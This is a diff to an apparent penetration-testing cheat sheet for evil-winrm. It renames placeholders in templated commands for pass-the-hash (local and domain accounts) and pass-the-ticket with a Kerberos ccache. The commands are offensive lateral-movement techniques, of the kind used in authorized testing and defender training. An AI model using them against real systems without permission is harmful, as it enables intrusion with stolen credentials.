@@ -13,12 +13,12 @@ evil-winrm -i <ip> -u <user>@<domain> -p <password>
 
 ## local account pth
 ```bash
-evil-winrm -i <ip> -u <user> -H <hash>
+evil-winrm -i <ip> -u <user> -H <nt_hash>
 ```
 
 ## domain account pth
 ```bash
-evil-winrm -i <ip> -u <user>@<domain> -H <hash>
+evil-winrm -i <ip> -u <user>@<domain> -H <nt_hash>
 ```
 
 ## pass the ticket
@@ -30,5 +30,5 @@ CONTOSO.COM = {
              kdc = fooserver.contoso.com
  }
 ```bash
-export KRB5CCNAME=<ticket> && evil-winrm -i <target_fqdn>  --realm <domain>
+export KRB5CCNAME=<ccache> && evil-winrm -i <target_fqdn>  --realm <domain>
 ```
